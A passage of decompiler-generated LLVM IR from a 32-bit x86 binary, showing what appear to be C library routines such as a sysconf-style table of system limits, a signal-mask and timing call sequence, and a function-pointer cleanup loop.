  %v5_8054843 = call i32 @function_80551d7(%timespec* %v4_8054843, i32 %v2_8054836, i32 %v0_805483f, i32 %v0_805483f)
  store i32 %v5_8054843, i32* %eax.global-to-local, align 4
  store i32 %v5_8054843, i32* @edi, align 4
  %v1_805484a = call i32 @function_80530b9(i32 %v2_8054836)
  store i32 %v1_805484a, i32* %eax.global-to-local, align 4
  store i32 %v1_805484a, i32* @ebx, align 4
  %v1_8054854 = inttoptr i32 %v1_805484a to i32*
  %v2_8054854 = load i32, i32* %v1_8054854, align 4
  store i32 %v2_8054854, i32* @esi, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_805485b = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_805485b = call i32 @function_8052ded(i32 2, %_TYPEDEF_sigset_t* %v3_805485b, i32 0)
  store i32 %v4_805485b, i32* %eax.global-to-local, align 4
  %v0_8054860 = load i32, i32* @esi, align 4
  %v1_8054860 = load i32, i32* @ebx, align 4
  %v2_8054860 = inttoptr i32 %v1_8054860 to i32*
  store i32 %v0_8054860, i32* %v2_8054860, align 4
  %v0_805488a.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8054887

dec_label_pc_8054864:                             ; preds = %dec_label_pc_805482a
  store i32 2, i32* %stack_var_-460, align 4
  %v3_805486a = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_805486a = call i32 @function_8052ded(i32 2, %_TYPEDEF_sigset_t* %v3_805486a, i32 0)
  store i32 %v4_805486a, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054880

dec_label_pc_8054875:                             ; preds = %dec_label_pc_80547a7
  %v2_8054877 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8054877, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054880

dec_label_pc_8054880:                             ; preds = %dec_label_pc_8054864, %dec_label_pc_8054875
  %storemerge3.pre-phi = phi i32 [ %v2_8054836, %dec_label_pc_8054864 ], [ %v2_8054877, %dec_label_pc_8054875 ]
  %v3_8054880 = phi i32 [ %v2_805478c, %dec_label_pc_8054864 ], [ %v4_80547ac, %dec_label_pc_8054875 ]
  %v2_8054880 = phi i32 [ 0, %dec_label_pc_8054864 ], [ %v4_80547ac, %dec_label_pc_8054875 ]
  store i32 %storemerge3.pre-phi, i32* %stack_var_-460, align 4
  %v4_8054880 = bitcast i32* %stack_var_-24 to %timespec*
  %v5_8054880 = call i32 @function_80551d7(%timespec* %v4_8054880, i32 %storemerge3.pre-phi, i32 %v2_8054880, i32 %v3_8054880)
  store i32 %v5_8054880, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054887

dec_label_pc_8054887:                             ; preds = %dec_label_pc_805483f, %dec_label_pc_8054880
  %v0_805488a = phi i32 [ %v0_805488a.pre, %dec_label_pc_805483f ], [ %v5_8054880, %dec_label_pc_8054880 ]
  %v1_805488a = icmp eq i32 %v0_805488a, 0
  br i1 %v1_805488a, label %dec_label_pc_80548a7, label %dec_label_pc_805488e

dec_label_pc_805488e:                             ; preds = %dec_label_pc_8054887
  %v4_805489e = load i32, i32* %stack_var_-24, align 4
  store i32 %v4_805489e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80548ae

dec_label_pc_80548a7:                             ; preds = %dec_label_pc_8054730, %dec_label_pc_8054887
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80548ae

dec_label_pc_80548ab:                             ; preds = %dec_label_pc_80547d0, %dec_label_pc_805478b, %dec_label_pc_805475d
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80548ae

dec_label_pc_80548ae:                             ; preds = %dec_label_pc_80548a7, %dec_label_pc_805488e, %dec_label_pc_8054802, %dec_label_pc_80548ab
  %v0_80548b8 = phi i32 [ 0, %dec_label_pc_80548a7 ], [ %v4_805489e, %dec_label_pc_805488e ], [ %v0_80548b8.pre, %dec_label_pc_8054802 ], [ -1, %dec_label_pc_80548ab ]
  store i32 %v0_8054733, i32* @ebx, align 4
  store i32 %v0_8054732, i32* @esi, align 4
  store i32 %v0_8054731, i32* @edi, align 4
  store i32 %v0_8054730, i32* @ebp, align 4
  ret i32 %v0_80548b8

; uselistorder directives
  uselistorder i32 %storemerge3.pre-phi, { 1, 0 }
  uselistorder i32 %v1_805484a, { 1, 0, 2 }
  uselistorder i32 %v2_8054836, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_80547cd, { 2, 1, 0 }
  uselistorder i32 %v4_80547ac, { 1, 0, 2, 3 }
  uselistorder i32 %v2_805478c, { 0, 2, 4, 3, 1, 5 }
  uselistorder i32 %v2_8054773, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_805475a, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-460, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-24, { 2, 0, 4, 1, 5, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 5, 6, 3, 4, 2 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 25, 0, 1, 23 }
  uselistorder i32 (i32, i32*, i32)* @function_8054c7f, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_80534ce, { 2, 1, 0, 3, 4 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80548ae, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80548a7, { 1, 0 }
  uselistorder label %dec_label_pc_8054887, { 1, 0 }
  uselistorder label %dec_label_pc_8054880, { 1, 0 }
  uselistorder label %dec_label_pc_80547c2.dec_label_pc_80547c2_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_805474f.dec_label_pc_805474f_crit_edge, { 1, 0 }
}

define i32 @function_80548b9(i32 %arg1) local_unnamed_addr {
dec_label_pc_80548b9:
  switch i32 %arg1, label %dec_label_pc_80548d8 [
    i32 0, label %dec_label_pc_80548e8
    i32 1, label %dec_label_pc_80549cd
    i32 2, label %dec_label_pc_80548f2
    i32 3, label %dec_label_pc_80548fc
    i32 4, label %dec_label_pc_8054906
    i32 5, label %dec_label_pc_805499c
    i32 6, label %dec_label_pc_805490e
    i32 7, label %dec_label_pc_80548ce
    i32 8, label %dec_label_pc_80548ce
    i32 9, label %dec_label_pc_80548ce
    i32 10, label %dec_label_pc_80548ce
    i32 11, label %dec_label_pc_80548ce
    i32 12, label %dec_label_pc_80548ce
    i32 13, label %dec_label_pc_80548ce
    i32 14, label %dec_label_pc_80548ce
    i32 15, label %dec_label_pc_80548ce
    i32 16, label %dec_label_pc_80548ce
    i32 17, label %dec_label_pc_80548ce
    i32 18, label %dec_label_pc_80548ce
    i32 19, label %dec_label_pc_80548ce
    i32 20, label %dec_label_pc_80548ce
    i32 21, label %dec_label_pc_80548ce
    i32 22, label %dec_label_pc_80548ce
    i32 23, label %dec_label_pc_80549cd
    i32 24, label %dec_label_pc_80549cd
    i32 25, label %dec_label_pc_80549d9
    i32 26, label %dec_label_pc_80549aa
    i32 27, label %dec_label_pc_80549cd
    i32 28, label %dec_label_pc_8054920
    i32 29, label %dec_label_pc_80549a3
    i32 30, label %dec_label_pc_8054918
    i32 31, label %dec_label_pc_80549b8
    i32 32, label %dec_label_pc_80549cd
    i32 33, label %dec_label_pc_80549cd
    i32 34, label %dec_label_pc_80549cd
    i32 35, label %dec_label_pc_80549b1
    i32 36, label %dec_label_pc_80549e0
    i32 37, label %dec_label_pc_80549e7
    i32 38, label %dec_label_pc_80549e0
    i32 39, label %dec_label_pc_805492a
    i32 40, label %dec_label_pc_80549ee
    i32 41, label %dec_label_pc_80549cd
    i32 42, label %dec_label_pc_80549b8
    i32 43, label %dec_label_pc_80549e7
    i32 44, label %dec_label_pc_80549f5
    i32 45, label %dec_label_pc_80549e7
    i32 46, label %dec_label_pc_80549a3
    i32 47, label %dec_label_pc_80549a3
    i32 48, label %dec_label_pc_80549a3
    i32 49, label %dec_label_pc_80549cd
    i32 50, label %dec_label_pc_80549cd
    i32 51, label %dec_label_pc_80549a3
    i32 52, label %dec_label_pc_80549a3
    i32 53, label %dec_label_pc_80549cd
    i32 54, label %dec_label_pc_80549cd
    i32 55, label %dec_label_pc_80549cd
    i32 56, label %dec_label_pc_80549cd
    i32 57, label %dec_label_pc_80549cd
    i32 58, label %dec_label_pc_80549cd
    i32 59, label %dec_label_pc_80549cd
    i32 60, label %dec_label_pc_80549cd
    i32 61, label %dec_label_pc_80549cd
    i32 62, label %dec_label_pc_80549cd
    i32 63, label %dec_label_pc_80549cd
    i32 64, label %dec_label_pc_80549cd
    i32 65, label %dec_label_pc_80549cd
    i32 66, label %dec_label_pc_80549cd
    i32 67, label %dec_label_pc_80548ce
    i32 68, label %dec_label_pc_80548ce
    i32 69, label %dec_label_pc_80549b1
    i32 70, label %dec_label_pc_80549b1
    i32 71, label %dec_label_pc_80549b1
    i32 72, label %dec_label_pc_80549b8
    i32 73, label %dec_label_pc_80549bf
    i32 74, label %dec_label_pc_80549c6
    i32 75, label %dec_label_pc_8054934
    i32 76, label %dec_label_pc_80549c6
    i32 77, label %dec_label_pc_80548ce
    i32 78, label %dec_label_pc_80548ce
    i32 79, label %dec_label_pc_80548ce
    i32 80, label %dec_label_pc_80548ce
    i32 81, label %dec_label_pc_80548ce
    i32 82, label %dec_label_pc_80548ce
    i32 83, label %dec_label_pc_80548ce
    i32 84, label %dec_label_pc_80548ce
    i32 85, label %dec_label_pc_80549cd
    i32 86, label %dec_label_pc_80549cd
    i32 87, label %dec_label_pc_80549aa
    i32 88, label %dec_label_pc_805493e
    i32 89, label %dec_label_pc_8054948
    i32 90, label %dec_label_pc_80549bf
    i32 91, label %dec_label_pc_80548ce
    i32 92, label %dec_label_pc_80548ce
    i32 93, label %dec_label_pc_80548ce
    i32 94, label %dec_label_pc_80548ce
    i32 95, label %dec_label_pc_80549a3
    i32 96, label %dec_label_pc_80549cd
    i32 97, label %dec_label_pc_80549cd
    i32 98, label %dec_label_pc_80548ce
    i32 99, label %dec_label_pc_80548ce
    i32 100, label %dec_label_pc_80548ce
    i32 101, label %dec_label_pc_8054952
    i32 102, label %dec_label_pc_8054995
    i32 103, label %dec_label_pc_80549d2
    i32 104, label %dec_label_pc_80549aa
    i32 105, label %dec_label_pc_805495c
    i32 106, label %dec_label_pc_80549b8
    i32 107, label %dec_label_pc_80549b8
    i32 108, label %dec_label_pc_805499c
    i32 109, label %dec_label_pc_80549d9
    i32 110, label %dec_label_pc_80549f5
    i32 111, label %dec_label_pc_8054995
    i32 112, label %dec_label_pc_80549d2
    i32 113, label %dec_label_pc_80549f5
    i32 114, label %dec_label_pc_8054966
    i32 115, label %dec_label_pc_80549ee
    i32 116, label %dec_label_pc_80549cd
    i32 117, label %dec_label_pc_80549cd
    i32 118, label %dec_label_pc_8054970
    i32 119, label %dec_label_pc_805497a
    i32 120, label %dec_label_pc_80549e7
    i32 121, label %dec_label_pc_80549aa
    i32 122, label %dec_label_pc_80549aa
    i32 123, label %dec_label_pc_80549aa
    i32 124, label %dec_label_pc_80549aa
    i32 125, label %dec_label_pc_80548ce
    i32 126, label %dec_label_pc_80548ce
    i32 127, label %dec_label_pc_80549cd
    i32 128, label %dec_label_pc_80549cd
    i32 129, label %dec_label_pc_80548ce
    i32 130, label %dec_label_pc_80548ce
    i32 131, label %dec_label_pc_80549cd
    i32 149, label %dec_label_pc_8054981
  ]

dec_label_pc_80548ce:                             ; preds = %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9
  br label %dec_label_pc_80549fa

dec_label_pc_80548d8:                             ; preds = %dec_label_pc_80548b9
  %v1_80548d8 = call i32 @function_80530b9(i32 ptrtoint (i32* @0 to i32))
  %v1_80548dd = inttoptr i32 %v1_80548d8 to i32*
  store i32 22, i32* %v1_80548dd, align 4
  br label %dec_label_pc_80549cd

dec_label_pc_80548e8:                             ; preds = %dec_label_pc_80548b9
  br label %dec_label_pc_80549fa

dec_label_pc_80548f2:                             ; preds = %dec_label_pc_80548b9
  br label %dec_label_pc_80549fa

dec_label_pc_80548fc:                             ; preds = %dec_label_pc_80548b9
  br label %dec_label_pc_80549fa

dec_label_pc_8054906:                             ; preds = %dec_label_pc_80548b9
  %v0_8054909 = call i32 @function_8055005()
  br label %dec_label_pc_805490e

dec_label_pc_805490e:                             ; preds = %dec_label_pc_80548b9, %dec_label_pc_8054906
  br label %dec_label_pc_80549fa

dec_label_pc_8054918:                             ; preds = %dec_label_pc_80548b9
  %v0_805491b = call i32 @function_805509c()
  br label %dec_label_pc_8054920

dec_label_pc_8054920:                             ; preds = %dec_label_pc_80548b9, %dec_label_pc_8054918
  br label %dec_label_pc_80549fa

dec_label_pc_805492a:                             ; preds = %dec_label_pc_80548b9
  br label %dec_label_pc_80549fa

dec_label_pc_8054934:                             ; preds = %dec_label_pc_80548b9
  br label %dec_label_pc_80549fa

dec_label_pc_805493e:                             ; preds = %dec_label_pc_80548b9
  br label %dec_label_pc_80549fa

dec_label_pc_8054948:                             ; preds = %dec_label_pc_80548b9
  br label %dec_label_pc_80549fa

dec_label_pc_8054952:                             ; preds = %dec_label_pc_80548b9
  br label %dec_label_pc_80549fa

dec_label_pc_805495c:                             ; preds = %dec_label_pc_80548b9
  br label %dec_label_pc_80549fa

dec_label_pc_8054966:                             ; preds = %dec_label_pc_80548b9
  br label %dec_label_pc_80549fa

dec_label_pc_8054970:                             ; preds = %dec_label_pc_80548b9
  br label %dec_label_pc_80549fa

dec_label_pc_805497a:                             ; preds = %dec_label_pc_80548b9
  br label %dec_label_pc_80549fa

dec_label_pc_8054981:                             ; preds = %dec_label_pc_80548b9
  %v5_8054987 = call i32 @function_8054e08(i32 1, %timespec* null, i32 149, i32 149)
  %v2_805498f = icmp slt i32 %v5_8054987, 0
  %v1_8054991 = icmp eq i1 %v2_805498f, false
  br i1 %v1_8054991, label %dec_label_pc_80549a3, label %dec_label_pc_80549cd

dec_label_pc_8054995:                             ; preds = %dec_label_pc_80548b9, %dec_label_pc_80548b9
  br label %dec_label_pc_80549fa

dec_label_pc_805499c:                             ; preds = %dec_label_pc_80548b9, %dec_label_pc_80548b9
  br label %dec_label_pc_80549fa

dec_label_pc_80549a3:                             ; preds = %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_8054981
  br label %dec_label_pc_80549fa

dec_label_pc_80549aa:                             ; preds = %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9
  br label %dec_label_pc_80549fa

dec_label_pc_80549b1:                             ; preds = %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9
  br label %dec_label_pc_80549fa

dec_label_pc_80549b8:                             ; preds = %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9
  br label %dec_label_pc_80549fa

dec_label_pc_80549bf:                             ; preds = %dec_label_pc_80548b9, %dec_label_pc_80548b9
  br label %dec_label_pc_80549fa

dec_label_pc_80549c6:                             ; preds = %dec_label_pc_80548b9, %dec_label_pc_80548b9
  br label %dec_label_pc_80549fa

dec_label_pc_80549cd:                             ; preds = %dec_label_pc_8054981, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548d8
  br label %dec_label_pc_80549fa

dec_label_pc_80549d2:                             ; preds = %dec_label_pc_80548b9, %dec_label_pc_80548b9
  br label %dec_label_pc_80549fa

dec_label_pc_80549d9:                             ; preds = %dec_label_pc_80548b9, %dec_label_pc_80548b9
  br label %dec_label_pc_80549fa

dec_label_pc_80549e0:                             ; preds = %dec_label_pc_80548b9, %dec_label_pc_80548b9
  br label %dec_label_pc_80549fa

dec_label_pc_80549e7:                             ; preds = %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9
  br label %dec_label_pc_80549fa

dec_label_pc_80549ee:                             ; preds = %dec_label_pc_80548b9, %dec_label_pc_80548b9
  br label %dec_label_pc_80549fa

dec_label_pc_80549f5:                             ; preds = %dec_label_pc_80548b9, %dec_label_pc_80548b9, %dec_label_pc_80548b9
  br label %dec_label_pc_80549fa

dec_label_pc_80549fa:                             ; preds = %dec_label_pc_80549ee, %dec_label_pc_80549e7, %dec_label_pc_80549e0, %dec_label_pc_80549d9, %dec_label_pc_80549d2, %dec_label_pc_80549c6, %dec_label_pc_80549bf, %dec_label_pc_80549b8, %dec_label_pc_80549b1, %dec_label_pc_80549aa, %dec_label_pc_805499c, %dec_label_pc_8054995, %dec_label_pc_80549a3, %dec_label_pc_805497a, %dec_label_pc_8054970, %dec_label_pc_8054966, %dec_label_pc_805495c, %dec_label_pc_8054952, %dec_label_pc_8054948, %dec_label_pc_805493e, %dec_label_pc_8054934, %dec_label_pc_805492a, %dec_label_pc_8054920, %dec_label_pc_805490e, %dec_label_pc_80548fc, %dec_label_pc_80548f2, %dec_label_pc_80548e8, %dec_label_pc_80548ce, %dec_label_pc_80549cd, %dec_label_pc_80549f5
  %v0_80549fd = phi i32 [ 255, %dec_label_pc_80549ee ], [ 2048, %dec_label_pc_80549e7 ], [ 99, %dec_label_pc_80549e0 ], [ 20, %dec_label_pc_80549d9 ], [ -128, %dec_label_pc_80549d2 ], [ 1024, %dec_label_pc_80549c6 ], [ 4, %dec_label_pc_80549bf ], [ 32, %dec_label_pc_80549b8 ], [ 256, %dec_label_pc_80549b1 ], [ 2147483647, %dec_label_pc_80549aa ], [ 16, %dec_label_pc_805499c ], [ 127, %dec_label_pc_8054995 ], [ 200112, %dec_label_pc_80549a3 ], [ 9, %dec_label_pc_805497a ], [ 65535, %dec_label_pc_8054970 ], [ -32768, %dec_label_pc_8054966 ], [ -2147483648, %dec_label_pc_805495c ], [ 8, %dec_label_pc_8054952 ], [ 500, %dec_label_pc_8054948 ], [ 4096, %dec_label_pc_805493e ], [ 16384, %dec_label_pc_8054934 ], [ 1000, %dec_label_pc_805492a ], [ 32768, %dec_label_pc_8054920 ], [ 6, %dec_label_pc_805490e ], [ 65536, %dec_label_pc_80548fc ], [ 100, %dec_label_pc_80548f2 ], [ 131072, %dec_label_pc_80548e8 ], [ 1, %dec_label_pc_80548ce ], [ -1, %dec_label_pc_80549cd ], [ 32767, %dec_label_pc_80549f5 ]
  ret i32 %v0_80549fd

; uselistorder directives
  uselistorder i32 65536, { 33, 34, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 14, 15, 13, 16, 18, 17, 19, 1, 20, 0, 2, 23, 21, 24, 22, 27, 25, 26, 28, 29, 30, 31, 32 }
  uselistorder i32 16384, { 0, 5, 6, 7, 8, 9, 10, 11, 20, 21, 23, 24, 14, 15, 1, 2, 12, 13, 16, 17, 18, 19, 3, 4, 22, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32 -2147483648, { 0, 2, 1 }
  uselistorder i32 65535, { 3, 0, 1, 2, 4 }
  uselistorder i32 1024, { 2, 0, 3, 1, 4 }
  uselistorder i32 2048, { 5, 1, 6, 2, 0, 3, 4 }
  uselistorder i32 255, { 1, 3, 4, 6, 2, 7, 8, 9, 5, 0 }
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 131, { 4, 0, 1, 3, 2 }
  uselistorder i32 127, { 0, 2, 1 }
  uselistorder i32 124, { 4, 5, 3, 0, 1, 6, 2 }
  uselistorder i32 123, { 1, 0 }
  uselistorder i32 118, { 1, 0 }
  uselistorder i32 117, { 2, 0, 1 }
  uselistorder i32 116, { 1, 2, 0 }
  uselistorder i32 112, { 3, 0, 1, 4, 5, 2, 6, 7, 8 }
  uselistorder i32 111, { 4, 0, 2, 1, 3 }
  uselistorder i32 110, { 5, 1, 3, 2, 4, 0 }
  uselistorder i32 108, { 20, 21, 22, 17, 23, 11, 2, 15, 0, 1, 24, 12, 13, 18, 19, 25, 26, 14, 27, 3, 4, 5, 28, 29, 6, 30, 7, 8, 9, 10, 16, 31 }
  uselistorder i32 106, { 1, 0 }
  uselistorder i32 104, { 2, 3, 4, 1, 6, 5, 0 }
  uselistorder i32 99, { 2, 3, 1, 0 }
  uselistorder i32 96, { 1, 2, 3, 0, 4 }
  uselistorder i32 95, { 3, 1, 0, 2 }
  uselistorder i32 92, { 11, 12, 1, 0, 4, 2, 3, 6, 13, 14, 9, 10, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 8, 26, 27, 28, 5, 29, 30, 7, 35, 32, 33, 34, 31, 36 }
  uselistorder i32 87, { 2, 0, 1 }
  uselistorder i32 83, { 2, 0, 1 }
  uselistorder i32 80, { 1, 2, 0 }
  uselistorder i32 76, { 3, 4, 1, 5, 0, 6, 2 }
  uselistorder i32 68, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 60, { 3, 0, 1, 2 }
  uselistorder i32 58, { 1, 0 }
  uselistorder i32 55, { 2, 0, 1, 3 }
  uselistorder i32 54, { 2, 0, 1 }
  uselistorder i32 46, { 1, 2, 0 }
  uselistorder i32 43, { 7, 0, 3, 1, 4, 2, 5, 8, 6 }
  uselistorder i32 42, { 1, 2, 0 }
  uselistorder i32 41, { 1, 2, 3, 0 }
  uselistorder i32 39, { 1, 2, 3, 0 }
  uselistorder i32 38, { 2, 0, 3, 4, 1 }
  uselistorder i32 37, { 2, 0, 3, 4, 1 }
  uselistorder i32 34, { 3, 4, 5, 2, 0, 1, 6, 7, 8 }
  uselistorder i32 33, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 29, { 2, 0, 1 }
  uselistorder i32 27, { 1, 0 }
  uselistorder i32 25, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 23, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 21, { 3, 1, 2, 4, 5, 6, 0 }
  uselistorder i32 17, { 8, 5, 7, 2, 3, 1, 0, 4, 6, 9, 10 }
  uselistorder i32 13, { 3, 0, 1, 2, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 9, { 3, 11, 0, 1, 7, 16, 6, 4, 8, 5, 9, 14, 13, 12, 17, 18, 19, 20, 21, 22, 23, 10, 15, 2 }
  uselistorder i32 6, { 0, 14, 4, 5, 1, 28, 6, 2, 7, 16, 15, 17, 18, 19, 20, 21, 22, 23, 11, 8, 12, 13, 24, 25, 26, 27, 9, 3, 10 }
  uselistorder i32 5, { 13, 1, 18, 19, 7, 6, 8, 5, 15, 16, 14, 4, 2, 3, 17, 0, 9, 10, 12, 11 }
  uselistorder label %dec_label_pc_80549fa, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_80549cd, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_80549a3, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8054920, { 1, 0 }
  uselistorder label %dec_label_pc_805490e, { 1, 0 }
}

define i32 @function_80549fe() local_unnamed_addr {
dec_label_pc_80549fe:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80549fe = load i32, i32* @ebx, align 4
  store i32 %v0_80549fe, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8057164.233 to i32), i32 -134574436), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8057164.233 to i32), i32 -134574436), i32 2), i32 0), label %dec_label_pc_8054a12, label %dec_label_pc_8054a1f

dec_label_pc_8054a12:                             ; preds = %dec_label_pc_80549fe, %dec_label_pc_8054a12
  %v1_8054a198 = phi i32 [ %v1_8054a19, %dec_label_pc_8054a12 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8057164.233 to i32), i32 -134574436), i32 2), i32 -1), %dec_label_pc_80549fe ]
  store i32 ptrtoint (i32* @global_var_8054a19.234 to i32), i32* %stack_var_-16, align 4
  %v5_8054a12 = mul i32 %v1_8054a198, 4
  %v6_8054a12 = add i32 %v5_8054a12, ptrtoint (i32* @global_var_8057164.233 to i32)
  %v7_8054a12 = inttoptr i32 %v6_8054a12 to i32*
  %v8_8054a12 = load i32, i32* %v7_8054a12, align 4
  call void @__pseudo_call(i32 %v8_8054a12)
  %v0_8054a19.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054a19 = add i32 %v0_8054a19.pre, -1
  store i32 %v1_8054a19, i32* %ebx.global-to-local, align 4
  %v10_8054a1a = icmp eq i32 %v0_8054a19.pre, 0
  %v1_8054a1d = icmp eq i1 %v10_8054a1a, false
  br i1 %v1_8054a1d, label %dec_label_pc_8054a12, label %dec_label_pc_8054a1f

dec_label_pc_8054a1f:                             ; preds = %dec_label_pc_8054a12, %dec_label_pc_80549fe
  %v0_8054a1f = load i32, i32* @global_var_80572c8.235, align 8
  %v1_8054a24 = icmp eq i32 %v0_8054a1f, 0
  br i1 %v1_8054a24, label %dec_label_pc_8054a2a, label %dec_label_pc_8054a28

dec_label_pc_8054a28:                             ; preds = %dec_label_pc_8054a1f
  %v0_8054a28 = load i32, i32* %stack_var_-16, align 4
  %v1_8054a28 = call i32 @unknown_0(i32 %v0_8054a28)
  br label %dec_label_pc_8054a2a

dec_label_pc_8054a2a:                             ; preds = %dec_label_pc_8054a28, %dec_label_pc_8054a1f
  %v0_8054a2a = load i32, i32* @global_var_80572cc.236, align 4
  store i32 %v0_8054a2a, i32* @ecx, align 4
  %v1_8054a30 = icmp eq i32 %v0_8054a2a, 0
  br i1 %v1_8054a30, label %dec_label_pc_8054a39, label %dec_label_pc_8054a34

dec_label_pc_8054a34:                             ; preds = %dec_label_pc_8054a2a
  %v2_8054a34 = load i32, i32* %stack_var_-16, align 4
  %v1_8054a37 = call i32 @unknown_0(i32 %v2_8054a34)
  br label %dec_label_pc_8054a39

dec_label_pc_8054a39:                             ; preds = %dec_label_pc_8054a34, %dec_label_pc_8054a2a
  %v2_8054a39 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v2_8054a39

; uselistorder directives
  uselistorder i32 %v1_8054a19, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8054a12, { 1, 0 }
}

define i32 @function_8054a3d(i32 %arg1) local_unnamed_addr {
dec_label_pc_8054a3d:
  ret i32 0
}

define i32 @function_8054a40(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8054a40:
  %v0_8054a40 = load i32, i32* @eax, align 4
  ret i32 %v0_8054a40
}

define i32 @function_8054a41() local_unnamed_addr {
dec_label_pc_8054a41:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %v0_8054a41 = load i32, i32* @esi, align 4
  %v0_8054a42 = load i32, i32* @ebx, align 4
  %v0_8054a46 = load i32, i32* @eax, align 4
  store i32 %v0_8054a46, i32* @esi, align 4
  %v0_8054a48 = load i32, i32* @edx, align 4
  store i32 %v0_8054a48, i32* @ebx, align 4
